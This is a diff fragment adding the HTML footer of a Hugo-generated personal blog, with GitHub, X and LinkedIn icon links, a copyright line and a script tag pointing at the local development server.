+<a href="https://github.com/gatariee" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://x.com/gatariee" target="_blank" rel="noopener noreferrer me"
+    title="X">
+    <svg viewBox="0 0 1200 1227" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+    <path
+        d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z"/>
+</svg>
+</a>
+<a href="https://www.linkedin.com/in/zavierlee-sg/" target="_blank" rel="noopener noreferrer me"
+    title="Linkedin">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
+    <rect x="2" y="9" width="4" height="12"></rect>
+    <circle cx="4" cy="4" r="2"></circle>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2025 .
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js" ></script>
+
+    
+
+</body>
+</html>
